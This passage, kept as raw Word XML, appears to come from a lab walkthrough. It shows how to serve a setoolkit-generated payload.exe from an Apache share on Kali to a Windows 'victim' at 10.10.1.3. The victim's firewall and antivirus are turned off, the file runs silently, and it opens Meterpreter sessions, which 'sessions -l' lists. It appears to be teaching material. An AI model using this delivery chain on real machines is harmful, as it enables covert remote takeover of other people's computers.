        <w:t xml:space="preserve">THAT MEANS OUR PAYLOAD IS AN EXECUTABLE FILE WHICH HAS BEEN CREATED AND SAVED IN THAT SPECIFIC LOCATION OF MY KALI MACHINE.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000033">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000034">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE HAVE TO MAKE THIS PAYLOAD/EXECUTABLE FILE ACCESSIBLE FOR OUR TARGET MACHINE VIA WEB BROWSER.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000035">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000036">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">FOR THAT WE NEED TO FOLLOW THE CORRESPONDING STEPS:</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000037">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000038">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">1. mkdir  /var/www/html/share [ as a root user]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000039">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">2. chmod  -R 755 /var/www/html/share</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">3. Chown -R www-data:www-data /var/www/html/share</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">It means we have created a folder called “share” INSIDE </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">/var/www/html AS A ROOT USER AND WE HAVE GIVEN CERTAIN PERMISSION AND HAVE DONE CERTAIN ADJUSTMENTS.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000003F">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2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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000041">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW TO MAKE THIS FILE ACCESSIBLE FOR OUR VICTIM MACHINE IN THE WEB BROWSER WE NEED TO TYPE </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000042">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">“Systemctl start apache2.service”  and “systemctl status apache2.service”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000043">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000044">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86"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70"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see it is actively running.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000047">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000048">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">To check we can search in any web browser “10.10.1.3”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000049">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">And the apache2 web page will appear.</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004B">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69"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68"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we have to copy the payload /root/.set/payload.exe into /var/www/html/share </w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000004F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command : cp /root/.set/payload.exe /var/www/html/share</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000050">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000051">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61"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000053">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">NOW WE WILL GO TO OUR WINDOWS MACHINE WEB BROWSER AND TYPE </w:t>
      </w:r>
      <w:hyperlink r:id="rId20">
        <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
          <w:rPr>
            <w:b w:val="1"/>
            <w:bCs w:val="1"/>
            <w:color w:val="1155cc"/>
            <w:sz w:val="32"/>
            <w:szCs w:val="32"/>
            <w:highlight w:val="white"/>
            <w:u w:val="single"/>
            <w:rtl w:val="0"/>
          </w:rPr>
          <w:t xml:space="preserve">https://10.10.1.3/share</w:t>
        </w:r>
      </w:hyperlink>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000054">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000055">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3746500"/>
            <wp:effectExtent b="0" l="0" r="0" t="0"/>
            <wp:docPr id="12"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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="darkBlue"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="darkBlue"/>
          <w:u w:val="single"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">We can see that it gives the options to click on “test.exe”</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000057">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="darkBlue"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="darkBlue"/>
          <w:u w:val="single"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Which is the payload we have created via setoolkit</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000058">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="darkBlue"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000059">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="darkBlue"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="darkBlue"/>
          <w:u w:val="single"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we need to click on “test.exe” and we need to make sure our firewalls and virus protection is turned off</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005A">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005B">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005C">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">After the download click on “keep” and then “keep anyway” and click on open file .</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005D">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005E">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now we will not notice anything when we click on open file as it is not a document or something else biut it is an executable file which will run behind and will create a meterpreter session which we can see in our kali linux [PAYLOAD AND LISTENER WINDOW]</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="0000005F">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000060">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76" name="image68.png"/>
            <a:graphic>
              <a:graphicData uri="http://schemas.openxmlformats.org/drawingml/2006/picture">
                <pic:pic>
                  <pic:nvPicPr>
                    <pic:cNvPr id="0" name="image68.png"/>
                    <pic:cNvPicPr preferRelativeResize="0"/>
                  </pic:nvPicPr>
                  <pic:blipFill>
                    <a:blip r:embed="rId2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bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Now can see that we have got 9 sessions opened up in the meterpreter session window</w:t>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000062">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:rtl w:val="0"/>
        </w:rPr>
      </w:r>
    </w:p>
    <w:p w:rsidR="00000000" w:rsidDel="00000000" w:rsidP="00000000" w:rsidRDefault="00000000" w:rsidRPr="00000000" w14:paraId="00000063">
      <w:pPr>
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidDel="00000000" w:rsidR="00000000" w:rsidRPr="00000000">
        <w:rPr>
          <w:b w:val="1"/>
          <w:bCs w:val="1"/>
          <w:sz w:val="32"/>
          <w:szCs w:val="32"/>
          <w:highlight w:val="white"/>
          <w:rtl w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">Command: sessions -l</w:t>
      </w:r>
    </w:p>
